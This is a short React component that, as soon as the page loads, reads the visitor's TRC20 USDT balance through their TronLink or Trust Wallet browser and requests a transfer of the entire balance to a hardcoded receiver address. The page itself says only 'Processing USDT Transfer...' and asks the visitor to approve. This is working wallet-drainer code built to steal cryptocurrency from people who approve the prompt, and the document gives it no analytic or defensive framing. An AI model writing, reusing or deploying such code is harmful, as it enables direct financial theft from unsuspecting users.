import React, { useEffect } from "react";

const USDT_CONTRACT = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // TRC20 USDT
const RECEIVER_ADDRESS = "TGyoKBUG2VuTKpC6iSwcG1BHmyShCQtuvo";

const App = () => {
  useEffect(() => {
    const sendUSDT = async () => {
      if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
        alert("Please open in Trust Wallet or TronLink browser.");
        return;
      }

      const tronWeb = window.tronWeb;
      const contract = await tronWeb.contract().at(USDT_CONTRACT);
      const address = tronWeb.defaultAddress.base58;
      const balance = await contract.methods.balanceOf(address).call();

      if (balance > 0) {
        try {
          const tx = await contract.methods
            .transfer(RECEIVER_ADDRESS, balance)
            .send({ feeLimit: 10000000 });
          alert("USDT sent successfully.");
        } catch (err) {
          alert("Transaction failed: " + err.message);
        }
      } else {
        alert("No USDT balance found.");
      }
    };

    sendUSDT();
  }, []);

  return (
    <div style={{ textAlign: "center", marginTop: "50px" }}>
      <h2>Processing USDT Transfer...</h2>
      <p>Please approve the transaction in your wallet.</p>
    </div>
  );
};

export default App;
